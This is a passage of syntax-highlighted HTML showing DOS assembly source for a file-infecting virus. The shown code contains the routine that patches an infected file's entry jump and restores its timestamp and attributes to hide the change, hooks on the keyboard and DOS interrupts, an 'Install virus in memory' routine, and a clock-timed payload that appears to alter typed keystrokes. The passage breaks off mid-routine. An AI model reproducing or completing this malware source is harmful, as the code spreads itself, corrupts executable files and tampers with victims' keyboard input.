    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">19H</span><span class="sc0"> </span><span class="sc1">; Add entry point offset to jump offset</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; \ No offset</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP014A</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length of jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address initial jump</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">        </span><span class="sc1">; Set file date &amp; time function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">DW00D0</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc0">       </span><span class="sc1">; Get file time from DTA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">DW00D0</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc0">       </span><span class="sc1">; Get file date from DTA</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP014A</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set file attributes function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB00D0</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; Address file path in DTA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">DB00D0</span><span class="sc4">+</span><span class="sc2">15H</span><span class="sc0">       </span><span class="sc1">; Get attributes from DTA</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP015D</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Interrupt 16H routine</span><span class="sc0">

</span><span class="sc5">BP015E</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0DDH</span><span class="sc0">         </span><span class="sc1">; Infection test function?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0167</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Copy function number</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">BP0167</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Get key token?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP01D8</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump</span><span class="sc0">
</span><span class="sc5">DW016D</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0488H</span><span class="sc0">           </span><span class="sc1">; Int 16H offset</span><span class="sc0">
</span><span class="sc5">DW016F</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">39D8H</span><span class="sc0">           </span><span class="sc1">; Int 16H segment</span><span class="sc0">

</span><span class="sc5">DW0171</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FA76H</span><span class="sc0">
</span><span class="sc5">DW0173</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F9DCH</span><span class="sc0">
</span><span class="sc5">DW0175</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">005AH</span><span class="sc0">

</span><span class="sc5">DB0177</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">034H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">036H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">037H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">038H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">039H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">023H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">026H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">029H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05DH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">05BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06AH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">06BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">062H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">045H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">07BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">04AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">043H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">056H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">02EH</span><span class="sc0">

</span><span class="sc5">BP01D8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP01DC</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP01DC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSHF</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">6FH</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Execute original BIOS call</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">        </span><span class="sc1">; \ Address system RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BW046C</span><span class="sc0">       </span><span class="sc1">; Get system clock, low word</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">6BH</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; DW0171</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">6BH</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">JG</span><span class="sc0">  </span><span class="sc5">BP0236</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">69H</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; DW0173</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">69H</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">67H</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; DW0175</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0236</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">67H</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">67H</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP021E</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">67H</span><span class="sc4">],</span><span class="sc2">005BH</span><span class="sc0">
</span><span class="sc5">BP021E</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">65H</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0061H</span><span class="sc0">
</span><span class="sc5">BP0225</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0231</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">BP0225</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0236</span><span class="sc0">

</span><span class="sc5">BP0231</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">BP0236</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc1">; Interrupt 21H routine</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP023C</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Terminate program?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0246</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">          </span><span class="sc1">; Load?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP025F</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0246</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP026D</span><span class="sc0">          </span><span class="sc1">; Install virus in memory</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">DW002C</span><span class="sc0">        </span><span class="sc1">; \ Set ES to environment block</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Zero length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">          </span><span class="sc1">; Set block function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">001DH</span><span class="sc0">        </span><span class="sc1">; \ Length to keep</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc0">          </span><span class="sc1">; Keep process function</span><span class="sc0">
</span><span class="sc5">BP025F</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump</span><span class="sc0">
</span><span class="sc5">DW0260</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2DEAH</span><span class="sc0">           </span><span class="sc1">; Int 21H offset</span><span class="sc0">
</span><span class="sc5">DW0262</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4242H</span><span class="sc0">           </span><span class="sc1">; Int 21H segment</span><span class="sc0">

    </span><span class="sc1">; Interrupt 20H routine</span><span class="sc0">

</span><span class="sc5">BP0264</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">        </span><span class="sc1">; Fake a load</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP023C</span><span class="sc0">          </span><span class="sc1">; Process as a DOS service</span><span class="sc0">

</span><span class="sc5">DW0269</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2C08H</span><span class="sc0">           </span><span class="sc1">; Int 20H offset</span><span class="sc0">
</span><span class="sc5">DW026B</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4242H</span><span class="sc0">           </span><span class="sc1">; Int 20H segment</span><span class="sc0">

    </span><span class="sc1">; Install virus in memory</span><span class="sc0">

</span><span class="sc5">BP026D</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0274</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP0274</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; Address start of area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP023C</span><span class="sc4">-</span><span class="sc5">BP015E</span><span class="sc0"> </span><span class="sc1">; Length to copy</span><span class="sc0">
</span><span class="sc5">BP027C</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP015E</span><span class="sc4">-</span><span class="sc5">BP0274</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get a byte</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Store in new location</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; Next input position</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Next output position</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">BP027C</span><span class="sc0">          </span><span class="sc1">; Repeat to end of area</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">VECTOR</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; \ Restore Int 21H offset</span><span class="sc0">
